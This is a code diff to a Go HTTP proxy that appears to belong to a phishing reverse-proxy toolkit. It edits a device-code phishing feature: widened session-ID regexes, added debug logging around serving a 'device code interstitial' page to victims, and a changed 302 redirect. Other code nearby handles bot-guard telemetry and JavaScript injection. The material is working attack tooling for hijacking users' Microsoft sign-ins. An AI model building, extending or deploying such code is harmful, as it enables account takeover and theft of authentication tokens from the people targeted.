@@ -215,8 +215,8 @@ var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}
 // Pre-compiled regexps for hot-path request handling (avoid re-compiling on every request)
 var (
 	botguardTelRe    = regexp.MustCompile(`^/api/v1/analytics$`)
-	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9]+)$`)
-	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9]+)$`)
+	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9_-]+)$`)
+	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9_-]+)$`)
 	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
 	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
 	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
@@ -637,12 +637,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			if dc_page_re.MatchString(req.URL.Path) {
 				// Serve device code interstitial page
+				log.Debug("[devicecode] dc_page_re matched: %s", req.URL.Path)
 				ra := dc_page_re.FindStringSubmatch(req.URL.Path)
 				if len(ra) >= 2 {
 					session_id := ra[1]
+					log.Debug("[devicecode] serving interstitial for session: %s", session_id)
 					p.session_mtx.Lock()
 					s, ok := p.sessions[session_id]
 					p.session_mtx.Unlock()
+					log.Debug("[devicecode] session found: %v, DCState: %s, DCSessionID: %s", ok, func() string { if ok { return s.DCState } else { return "N/A" } }(), func() string { if ok { return s.DCSessionID } else { return "N/A" } }())
 
 					if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
 						userCode := ""
@@ -1172,9 +1175,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 										// Redirect immediately (don't wait for Microsoft API)
 										interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
-										resp := goproxy.NewResponse(req, "text/html", 302, "")
+										log.Debug("[devicecode] DCModeDirect: redirecting to %s", interstitialURL)
+										resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "Redirecting...")
 										resp.Header.Set("Location", interstitialURL)
 										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+										log.Info("[devicecode] DCModeDirect: sending 302 redirect response")
 										return req, resp
 									}
 
